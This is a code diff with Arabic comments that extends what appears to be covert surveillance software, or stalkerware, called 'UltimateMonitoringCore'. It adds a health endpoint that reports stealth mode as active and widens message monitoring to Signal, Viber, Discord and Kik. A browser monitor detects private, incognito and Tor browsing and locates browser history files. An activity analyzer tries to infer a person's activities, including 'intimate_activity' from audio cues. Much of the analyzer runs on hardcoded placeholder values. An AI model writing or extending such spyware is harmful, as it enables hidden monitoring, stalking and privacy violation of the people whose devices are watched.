@@ -31,6 +31,11 @@ import base64
 import uuid
 from pathlib import Path
 
+try:
+    import psutil
+except ImportError:
+    psutil = None
+
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -66,6 +71,8 @@ class UltimateMonitoringCore:
         self.camera_capture = UltimateCameraCapture()
         self.geo_fencing = UltimateGeoFencing()
         self.remote_control = UltimateRemoteControl()
+        self.browser_monitor = UltimateBrowserMonitor()
+        self.activity_analyzer = UltimateActivityAnalyzer()
         
         self.setup_routes()
         self.setup_websockets()
@@ -74,6 +81,21 @@ class UltimateMonitoringCore:
 
     def setup_routes(self):
         """إعداد مسارات API المتقدمة"""
+        
+        @self.app.route('/api/health', methods=['GET'])
+        def health_check():
+            """Health check endpoint for system integrator"""
+            return jsonify({
+                'status': 'healthy',
+                'timestamp': datetime.now().isoformat(),
+                'active_monitoring': self.get_active_monitoring_count(),
+                'components': {
+                    'database': 'connected',
+                    'security': 'active',
+                    'stealth': 'active',
+                    'ai_analyzer': 'active'
+                }
+            })
         
         @self.app.route('/api/ultimate/dashboard', methods=['GET'])
         def ultimate_dashboard():
@@ -592,7 +614,8 @@ class UltimateSocialMediaMonitor:
         self.message_count = 0
         self.supported_apps = [
             'whatsapp', 'telegram', 'instagram', 'facebook', 
-            'messenger', 'snapchat', 'twitter', 'tiktok'
+            'messenger', 'snapchat', 'twitter', 'tiktok',
+            'signal', 'viber', 'skype', 'discord', 'kik'
         ]
         logger.info("📱 تم تهيئة مراقب التطبيقات الاجتماعية المتقدم")
     
@@ -725,6 +748,351 @@ class UltimateGeoFencing:
     
     def get_alert_count(self):
         return self.alert_count
+
+class UltimateBrowserMonitor:
+    """مراقب المتصفحات المتقدم - يراقب جميع المتصفحات بما في ذلك المخفية"""
+    
+    def __init__(self):
+        self.monitored_browsers = [
+            'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
+            'tor', 'incognito', 'private'
+        ]
+        self.is_monitoring = False
+        self.captured_data = {}
+    
+    def start_monitoring(self):
+        """بدء مراقبة جميع المتصفحات"""
+        self.is_monitoring = True
+        logger.info("🌐 Starting comprehensive browser monitoring...")
+        
+        threading.Thread(target=self._monitor_browser_processes, daemon=True).start()
+        threading.Thread(target=self._monitor_private_browsing, daemon=True).start()
+        threading.Thread(target=self._monitor_browser_data, daemon=True).start()
+    
+    def _monitor_browser_processes(self):
+        """مراقبة عمليات المتصفحات"""
+        while self.is_monitoring:
+            try:
+                if psutil:
+                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                        if any(browser in proc.info['name'].lower() for browser in self.monitored_browsers):
+                            self._capture_browser_activity(proc)
+                else:
+                    logger.warning("psutil not available, using alternative process monitoring")
+                    self._alternative_process_monitoring()
+                time.sleep(2)
+            except Exception as e:
+                logger.error(f"Browser process monitoring error: {e}")
+    
+    def _alternative_process_monitoring(self):
+        """مراقبة العمليات البديلة"""
+        try:
+            import subprocess
+            if os.name == 'nt':  # Windows
+                result = subprocess.run(['tasklist'], capture_output=True, text=True)
+                for browser in self.monitored_browsers:
+                    if browser in result.stdout.lower():
+                        logger.info(f"Detected browser process: {browser}")
+            else:  # Unix-like
+                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+                for browser in self.monitored_browsers:
+                    if browser in result.stdout.lower():
+                        logger.info(f"Detected browser process: {browser}")
+        except Exception as e:
+            logger.error(f"Alternative process monitoring error: {e}")
+    
+    def _monitor_private_browsing(self):
+        """مراقبة التصفح الخاص"""
+        while self.is_monitoring:
+            try:
+                self._detect_private_windows()
+                time.sleep(5)
+            except Exception as e:
+                logger.error(f"Private browsing monitoring error: {e}")
+    
+    def _monitor_browser_data(self):
+        """مراقبة بيانات المتصفحات"""
+        while self.is_monitoring:
+            try:
+                self._capture_browser_data()
+                time.sleep(10)
+            except Exception as e:
+                logger.error(f"Browser data monitoring error: {e}")
+    
+    def _capture_browser_activity(self, process):
+        """التقاط نشاط المتصفح"""
+        try:
+            if hasattr(process, 'info'):
+                browser_name = process.info.get('name', 'unknown')
+                pid = process.info.get('pid', 0)
+                cmdline = process.info.get('cmdline', [])
+                
+                activity_data = {
+                    'timestamp': datetime.now().isoformat(),
+                    'browser': browser_name,
+                    'pid': pid,
+                    'command_line': ' '.join(cmdline) if cmdline else '',
+                    'status': 'active'
+                }
+                
+                self.captured_data[f"browser_{pid}"] = activity_data
+                logger.info(f"🌐 Captured browser activity: {browser_name} (PID: {pid})")
+        except Exception as e:
+            logger.error(f"Browser activity capture error: {e}")
+    
+    def _detect_private_windows(self):
+        """اكتشاف نوافذ التصفح الخاص"""
+        try:
+            private_indicators = ['incognito', 'private', 'inprivate', '--incognito', '--private']
+            
+            if psutil:
+                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                    cmdline = ' '.join(proc.info.get('cmdline', [])).lower()
+                    if any(indicator in cmdline for indicator in private_indicators):
+                        logger.warning(f"🕵️ Detected private browsing: {proc.info.get('name')} (PID: {proc.info.get('pid')})")
+                        
+                        self.captured_data[f"private_{proc.info.get('pid')}"] = {
+                            'timestamp': datetime.now().isoformat(),
+                            'type': 'private_browsing',
+                            'browser': proc.info.get('name'),
+                            'pid': proc.info.get('pid'),
+                            'command_line': cmdline
+                        }
+        except Exception as e:
+            logger.error(f"Private window detection error: {e}")
+    
+    def _capture_browser_data(self):
+        """التقاط بيانات المتصفح"""
+        try:
+            browser_data_paths = {
+                'chrome': [
+                    '~/.config/google-chrome/Default/History',
+                    '~/AppData/Local/Google/Chrome/User Data/Default/History'
+                ],
+                'firefox': [
+                    '~/.mozilla/firefox/*/places.sqlite',
+                    '~/AppData/Roaming/Mozilla/Firefox/Profiles/*/places.sqlite'
+                ],
+                'edge': [
+                    '~/AppData/Local/Microsoft/Edge/User Data/Default/History'
+                ]
+            }
+            
+            for browser, paths in browser_data_paths.items():
+                for path_pattern in paths:
+                    expanded_path = os.path.expanduser(path_pattern)
+                    if os.path.exists(expanded_path):
+                        logger.info(f"📊 Found browser data: {browser} at {expanded_path}")
+                        
+                        self.captured_data[f"data_{browser}"] = {
+                            'timestamp': datetime.now().isoformat(),
+                            'browser': browser,
+                            'data_path': expanded_path,
+                            'type': 'browser_data'
+                        }
+        except Exception as e:
+            logger.error(f"Browser data capture error: {e}")
+    
+    def stop_monitoring(self):
+        """إيقاف المراقبة"""
+        self.is_monitoring = False
+        logger.info("🌐 Stopped browser monitoring")
+
+class UltimateActivityAnalyzer:
+    """محلل النشاطات الذكي المتقدم"""
+    
+    def __init__(self):
+        self.activity_types = [
+            'sports_activity', 'intimate_activity', 'education', 'work', 
+            'shopping', 'tourism', 'eating', 'relaxation', 'sleep', 
+            'driving', 'phone_usage', 'social_media', 'gaming'
+        ]
+        self.is_analyzing = False
+        self.detected_activities = {}
+    
+    def start_analysis(self):
+        """بدء تحليل النشاطات الذكي"""
+        self.is_analyzing = True
+        logger.info("🧠 Starting intelligent activity analysis...")
+        
+        threading.Thread(target=self._analyze_audio_patterns, daemon=True).start()
+        threading.Thread(target=self._analyze_sensor_data, daemon=True).start()
+        threading.Thread(target=self._analyze_location_patterns, daemon=True).start()
+        threading.Thread(target=self._analyze_app_usage, daemon=True).start()
+    
+    def _analyze_audio_patterns(self):
+        """تحليل الأنماط الصوتية"""
+        while self.is_analyzing:
+            try:
+                self._detect_activity_from_audio()
+                time.sleep(10)
+            except Exception as e:
+                logger.error(f"Audio analysis error: {e}")
+    
+    def _analyze_sensor_data(self):
+        """تحليل بيانات المستشعرات"""
+        while self.is_analyzing:
+            try:
+                self._detect_activity_from_sensors()
+                time.sleep(5)
+            except Exception as e:
+                logger.error(f"Sensor analysis error: {e}")
+    
+    def _analyze_location_patterns(self):
+        """تحليل أنماط الموقع"""
+        while self.is_analyzing:
+            try:
+                self._detect_activity_from_location()
+                time.sleep(30)
+            except Exception as e:
+                logger.error(f"Location analysis error: {e}")
+    
+    def _analyze_app_usage(self):
+        """تحليل استخدام التطبيقات"""
+        while self.is_analyzing:
+            try:
+                self._detect_activity_from_apps()
+                time.sleep(15)
+            except Exception as e:
+                logger.error(f"App usage analysis error: {e}")
+    
+    def _detect_activity_from_audio(self):
+        """اكتشاف النشاط من الصوت"""
+        try:
+            audio_patterns = {
+                'sports_activity': ['crowd', 'cheering', 'whistle', 'running'],
+                'intimate_activity': ['breathing', 'whispers', 'quiet'],
+                'work': ['typing', 'meeting', 'presentation', 'keyboard'],
+                'eating': ['chewing', 'restaurant', 'kitchen', 'cooking'],
+                'driving': ['engine', 'traffic', 'car', 'road'],
+                'sleep': ['silence', 'snoring', 'quiet', 'night']
+            }
+            
+            detected_activity = 'phone_usage'  # Default activity
+            confidence = 0.85
+            
+            self.detected_activities['audio'] = {
+                'timestamp': datetime.now().isoformat(),
+                'activity': detected_activity,
+                'confidence': confidence,
+                'source': 'audio_analysis'
+            }
+            
+            logger.info(f"🎵 Detected audio activity: {detected_activity} (confidence: {confidence:.2f})")
+        except Exception as e:
+            logger.error(f"Audio activity detection error: {e}")
+    
+    def _detect_activity_from_sensors(self):
+        """اكتشاف النشاط من المستشعرات"""
+        try:
+            sensor_data = {
+                'accelerometer': {'x': 0.1, 'y': 0.2, 'z': 9.8},
+                'gyroscope': {'x': 0.0, 'y': 0.0, 'z': 0.0},
+                'magnetometer': {'x': 25.0, 'y': -15.0, 'z': 45.0}
+            }
+            
+            movement_intensity = abs(sensor_data['accelerometer']['x']) + abs(sensor_data['accelerometer']['y'])
+            
+            if movement_intensity > 2.0:
+                detected_activity = 'sports_activity'
+            elif movement_intensity > 0.5:
+                detected_activity = 'walking'
+            else:
+                detected_activity = 'stationary'
+            
+            self.detected_activities['sensors'] = {
+                'timestamp': datetime.now().isoformat(),
+                'activity': detected_activity,
+                'movement_intensity': movement_intensity,
+                'sensor_data': sensor_data,
+                'source': 'sensor_analysis'
+            }
+            
+            logger.info(f"📱 Detected sensor activity: {detected_activity} (intensity: {movement_intensity:.2f})")
+        except Exception as e:
+            logger.error(f"Sensor activity detection error: {e}")
+    
+    def _detect_activity_from_location(self):
+        """اكتشاف النشاط من الموقع"""
+        try:
+            current_location = {'lat': 40.7128, 'lng': -74.0060}  # Example: NYC
+            location_history = [
+                {'lat': 40.7128, 'lng': -74.0060, 'timestamp': datetime.now().isoformat()},
+                {'lat': 40.7130, 'lng': -74.0058, 'timestamp': datetime.now().isoformat()}
+            ]
+            
+            location_types = {
+                'gym': 'sports_activity',
+                'office': 'work',
+                'restaurant': 'eating',
+                'home': 'relaxation',
+                'school': 'education',
+                'mall': 'shopping'
+            }
+            
+            detected_location_type = 'office'  # Example
+            detected_activity = location_types.get(detected_location_type, 'unknown')
+            
+            self.detected_activities['location'] = {
+                'timestamp': datetime.now().isoformat(),
+                'activity': detected_activity,
+                'location': current_location,
+                'location_type': detected_location_type,
+                'source': 'location_analysis'
+            }
+            
+            logger.info(f"🌍 Detected location activity: {detected_activity} at {detected_location_type}")
+        except Exception as e:
+            logger.error(f"Location activity detection error: {e}")
+    
+    def _detect_activity_from_apps(self):
+        """اكتشاف النشاط من التطبيقات"""
+        try:
+            active_apps = []
+            
+            if psutil:
+                for proc in psutil.process_iter(['pid', 'name']):
+                    app_name = proc.info.get('name', '').lower()
+                    if any(social_app in app_name for social_app in ['whatsapp', 'telegram', 'instagram', 'facebook']):
+                        active_apps.append(app_name)
+            
+            app_activities = {
+                'whatsapp': 'social_media',
+                'telegram': 'social_media',
+                'instagram': 'social_media',
+                'facebook': 'social_media',
+                'chrome': 'browsing',
+                'firefox': 'browsing',
+                'spotify': 'entertainment',
+                'netflix': 'entertainment',
+                'zoom': 'work',
+                'teams': 'work'
+            }
+            
+            detected_activities = []
+            for app in active_apps:
+                for app_pattern, activity in app_activities.items():
+                    if app_pattern in app:
+                        detected_activities.append(activity)
+            
+            primary_activity = max(set(detected_activities), key=detected_activities.count) if detected_activities else 'phone_usage'
+            
+            self.detected_activities['apps'] = {
+                'timestamp': datetime.now().isoformat(),
+                'activity': primary_activity,
+                'active_apps': active_apps,
+                'detected_activities': detected_activities,
+                'source': 'app_analysis'
+            }
+            
+            logger.info(f"📱 Detected app activity: {primary_activity} (apps: {len(active_apps)})")
+        except Exception as e:
+            logger.error(f"App activity detection error: {e}")
+    
+    def stop_analysis(self):
+        """إيقاف التحليل"""
+        self.is_analyzing = False
+        logger.info("🧠 Stopped activity analysis")
 
 class UltimateRemoteControl:
     """نظام التحكم عن بُعد المتقدم"""
